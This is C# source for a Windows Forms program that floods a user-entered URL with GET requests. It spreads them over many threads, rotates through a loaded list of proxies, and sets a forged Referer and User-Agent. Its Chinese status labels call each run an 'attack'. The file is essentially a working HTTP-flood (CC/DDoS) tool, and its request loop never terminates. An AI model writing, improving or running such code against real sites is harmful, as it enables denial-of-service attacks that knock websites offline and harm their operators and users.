using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
 
using System.Net;
using System.Text;
using System.Threading;
 
using System.Windows.Forms;

namespace WindowsFormsApplication2
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        

        private void gj()
        {
            button1.Enabled = false;
            Control.CheckForIllegalCrossThreadCalls = false;
            ThreadPool.QueueUserWorkItem(new WaitCallback(ThreadStartMethod2));
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
        public class ThreadMulti
        {

            #region 变量

            public delegate void DelegateComplete();
            public delegate void DelegateWork(int taskindex, int threadindex);

            public DelegateComplete CompleteEvent;
            public DelegateWork WorkMethod;

            private Thread[] _threads;
            private bool[] _threadState;
            private int _taskCount = 0;
            private int _taskindex = 0;
            private int _threadCount = 20;//定义线程   

            #endregion

            public ThreadMulti(int taskcount)
            {
                _taskCount = taskcount;
            }

            public ThreadMulti(int taskcount, int threadCount)
            {
                _taskCount = taskcount;
                _threadCount = threadCount;
            }

            #region 获取任务 参考了老羽 http://www.cnblogs.com/michael-zhangyu/archive/2009/07/16/1524737.html 的博客
            private int GetTask()
            {
                lock (this)
                {
                    if (_taskindex < _taskCount)
                    {
                        _taskindex++;
                        return _taskindex;
                    }
                    else
                    {
                        return 0;
                    }
                }
            }
            #endregion

            #region Start

            /// <summary>
            /// 启动
            /// </summary>
            public void Start()
            {
                //采用 Hawker(http://www.cnblogs.com/tietaren/)的建议,精简了很多
                _taskindex = 0;
                int num = _taskCount < _threadCount ? _taskCount : _threadCount;
                _threadState = new bool[num];
                _threads = new Thread[num];

                for (int n = 0; n < num; n++)
                {
                    _threadState[n] = false;
                    _threads[n] = new Thread(new ParameterizedThreadStart(Work));
                    _threads[n].Start(n);
                }
            }

            /// <summary>
            /// 结束线程
            /// </summary>
            /// 
            public void Resume()
            {
                for (int i = 0; i < _threads.Length; i++)
                {
                    _threads[i].Resume();
                }
            }
            public void Stop()
            {
                for (int i = 0; i < _threads.Length; i++)
                {
                    _threads[i].Abort();
                }

                //string s = "";
                //for (int j = 0; j < _threads.Length; j++)
                //{
                //    s += _threads[j].ThreadState.ToString() + "\r\n";
                //}
                //MessageBox.Show(s);
            }
            public void Suspend()
            {
                for (int i = 0; i < _threads.Length; i++)
                {
                    _threads[i].Suspend();
                }

                //string s = "";
                //for (int j = 0; j < _threads.Length; j++)
                //{
                //    s += _threads[j].ThreadState.ToString() + "\r\n";
                //}
                //MessageBox.Show(s);
            }
            #endregion

            #region Work

            public void Work(object arg)
            {
                //提取任务并执行
                int threadindex = int.Parse(arg.ToString());
                int taskindex = GetTask();

                while (taskindex != 0 && WorkMethod != null)
                {
                    WorkMethod(taskindex, threadindex + 1);
                    taskindex = GetTask();
                }
                //所有的任务执行完毕
                _threadState[threadindex] = true;

                //处理并发 如果有两个线程同时完成只允许一个触发complete事件
                lock (this)
                {
                    for (int i = 0; i < _threadState.Length; i++)
                    {
                        if (_threadState[i] == false)
                        {
                            return;
                        }
                    }
                    //如果全部完成
                    if (CompleteEvent != null)
                    {
                        CompleteEvent();
                    }

                    //触发complete事件后 重置线程状态
                    //为了下个同时完成的线程不能通过上面的判断
                    for (int j = 0; j < _threadState.Length; j++)
                    {
                        _threadState[j] = false;
                    }
                }

            }

            #endregion
        }

        ThreadMulti thread;

        public void ThreadStartMethod2(object arg)
        {
            int workcount = Convert.ToInt32(numericUpDown2.Value);//定义总数
            ///  _count = workcount * 100;

            thread = new ThreadMulti(workcount, workcount);

            thread.WorkMethod = new ThreadMulti.DelegateWork(DoWork2);
            thread.CompleteEvent = new ThreadMulti.DelegateComplete(WorkComplete2);
            thread.Start();
        }
        public void DoWork2(int index, int threadindex)
        {
            int c=1;
            while (c < 3)
            {
                int m = listView1.Items.Count;
                Random r = new Random();
                int i = r.Next(0, m);
                //  MessageBox.Show(i.ToString());
                try
                {

                    listView1.Items[i].SubItems[2].Text = "攻击中";
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(textBox2.Text);
                        string encoding;
                        if (!string.IsNullOrEmpty(listView1.Items[i].SubItems[1].Text))
                        {
                            request.Proxy = new WebProxy(listView1.Items[i].SubItems[1].Text);

                        }
                        request.Timeout = 1000;
                        request.Method = "GET";
                        request.ContentType = "application/x-www-form-urlencoded";
                        request.Referer = textBox3.Text;
                        request.UserAgent = comboBox1.Text;
                        HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                        encoding = response.ContentEncoding;
                        if (encoding == null || encoding.Length < 1)
                        {
                            encoding = "UTF-8"; //默认编码
                        }
                        StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encoding));
                        string data = reader.ReadToEnd();
                        response.Close();

                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message);
                    }

                    listView1.Items[i].SubItems[2].Text = "第" + index + "次攻击结束";

                }
                catch
                {

                }
            }
        }
        public void WorkComplete2()
        {
            button1.Enabled = true;
            MessageBox.Show("攻击完毕");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            listView1.GridLines = true;
            listView1.FullRowSelect = true;
            listView1.View = View.Details;
            listView1.Columns.Add("ID", 40, HorizontalAlignment.Right);
            listView1.Columns.Add("代理数据", 120, HorizontalAlignment.Left);
            listView1.Columns.Add("状态", 100, HorizontalAlignment.Left);
           
        }

        private void button2_Click(object sender, EventArgs e)
        {
            openFileDialog1.Filter = "txt文件|*.txt";
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                StreamReader file = new StreamReader(@openFileDialog1.FileName, System.Text.Encoding.Default);
                string strLine = "";

                while (strLine != null)
                {
                    strLine = file.ReadLine();
                    if (strLine != null && !strLine.Equals(""))
                    {
                        ListViewItem item = new ListViewItem();
                        item.Text = (listView1.Items.Count + 1).ToString();
                        item.SubItems.Add(strLine);
                        item.SubItems.Add("等待命令");
                        listView1.Items.Add(item);
                    }
                    else
                    { }
                }

            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            gdj.Abort();
            button1.Enabled = true;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            System.Environment.Exit(0); 
        }
        public Thread gdj;
        private void button1_Click(object sender, EventArgs e)
        {
            gdj = new Thread(gj);
            gdj.Start();
        }
    }
}
